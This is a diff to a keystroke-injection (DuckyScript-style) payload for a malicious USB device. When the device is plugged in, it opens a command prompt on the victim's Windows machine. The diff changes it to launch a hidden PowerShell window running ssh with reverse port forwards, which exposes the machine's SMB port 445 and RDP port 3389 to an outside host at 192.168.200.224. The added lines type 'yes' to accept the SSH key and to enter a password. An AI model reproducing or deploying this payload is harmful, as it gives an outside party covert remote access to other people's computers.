@@ -11,12 +11,15 @@ DELAY 1
 STRING cmd
 ENTER
 DELAY 4
-STRING ssh -fN -R 10445:localhost:445 13389:localhost:3389 omg@192.168.200.224
+STRING powershell -windowstyle hidden -command ssh -fN -R 10445:localhost:445 -R 13389:localhost:3389 omg@192.168.200.224
 ENTER
-DELAY 1
+DELAY 2
+REM | Below is for initial SSH key acceptance, and/or submitting password (both "yes")
 STRING yes
 ENTER
-DELAY 1
+DELAY 2
+REM | Below is for submitting password (if initial SSH key acceptance dialog appeared before)
 STRING yes
 ENTER
+
 
